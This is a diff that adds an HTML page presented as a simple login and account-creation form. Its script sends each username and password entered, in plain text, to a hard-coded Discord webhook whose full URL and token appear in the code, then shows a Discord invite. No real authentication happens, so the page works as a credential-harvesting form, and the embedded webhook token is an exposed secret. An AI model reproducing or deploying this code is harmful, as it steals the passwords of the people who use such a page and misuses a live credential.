@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login and Create Account</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            width: 300px;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+        }
+
+        .form-container {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-container h2 {
+            margin-bottom: 20px;
+        }
+
+        .form-container input {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+
+        .form-container button {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            background-color: #007bff;
+            color: #fff;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .form-container button:hover {
+            background-color: #0056b3;
+        }
+
+        .message {
+            color: red;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+
+        .link {
+            color: #007bff;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+
+        .link:hover {
+            color: #0056b3;
+        }
+
+        .discord-invite {
+            color: #007bff;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+
+        .discord-invite a {
+            color: #007bff;
+            text-decoration: none;
+        }
+
+        .discord-invite a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="loginContainer">
+        <div class="form-container">
+            <h2>Login</h2>
+            <input type="text" id="loginUsername" placeholder="Username" required>
+            <input type="password" id="loginPassword" placeholder="Password" required>
+            <button onclick="login()">Login</button>
+            <p id="loginMessage" class="message"></p>
+            <p>Don't have an account? <span class="link" onclick="showCreateAccount()">Create one here</span></p>
+        </div>
+    </div>
+
+    <div class="container" id="createAccountContainer" style="display: none;">
+        <div class="form-container">
+            <h2>Create Account</h2>
+            <input type="text" id="createUsername" placeholder="Username" required>
+            <input type="password" id="createPassword" placeholder="Password" required>
+            <button onclick="createAccount()">Create Account</button>
+            <p id="createMessage" class="message"></p>
+            <p>Already have an account? <span class="link" onclick="showLogin()">Login here</span></p>
+        </div>
+    </div>
+
+    <script>
+        const webhookUrl = 'https://discord.com/api/webhooks/1272093344079806464/v1kDkT1u79OcijNzFKCVJnxpbkg43zkr24mfIq3rMwm2qogNljKGaMiwlq3xTrPwtlJN';
+        const discordInviteLink = 'https://discord.com/invite/JDBPWuyK'; // Your Discord server invite link
+
+        function showCreateAccount() {
+            document.getElementById('loginContainer').style.display = 'none';
+            document.getElementById('createAccountContainer').style.display = 'block';
+        }
+
+        function showLogin() {
+            document.getElementById('createAccountContainer').style.display = 'none';
+            document.getElementById('loginContainer').style.display = 'block';
+        }
+
+        async function login() {
+            const username = document.getElementById('loginUsername').value;
+            const password = document.getElementById('loginPassword').value;
+            const messageElement = document.getElementById('loginMessage');
+
+            if (!username || !password) {
+                messageElement.textContent = 'Please fill in all fields.';
+                return;
+            }
+
+            const payload = {
+                content: `Login Attempt:\nUsername: ${username}\nPassword: ${password}`
+            };
+
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (!response.ok) {
+                    throw new Error(`Error: ${response.status}`);
+                }
+
+                messageElement.innerHTML = `Login information sent successfully! <br><div class="discord-invite">Join our Discord server: <a href="${discordInviteLink}" target="_blank">Click here</a></div>`;
+            } catch (error) {
+                messageElement.textContent = `An error occurred: ${error.message}`;
+                console.error('Error sending data:', error);
+            }
+        }
+
+        async function createAccount() {
+            const username = document.getElementById('createUsername').value;
+            const password = document.getElementById('createPassword').value;
+            const messageElement = document.getElementById('createMessage');
+
+            if (!username || !password) {
+                messageElement.textContent = 'Please fill in all fields.';
+                return;
+            }
+
+            const payload = {
+                content: `Account Creation Attempt:\nUsername: ${username}\nPassword: ${password}`
+            };
+
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (!response.ok) {
+                    throw new Error(`Error: ${response.status}`);
+                }
+
+                messageElement.innerHTML = `Account creation information sent successfully! <br><div class="discord-invite">Join our Discord server: <a href="${discordInviteLink}" target="_blank">Click here</a></div>`;
+            } catch (error) {
+                messageElement.textContent = `An error occurred: ${error.message}`;
+                console.error('Error sending data:', error);
+            }
+        }
+    </script>
+</body>
+</html>
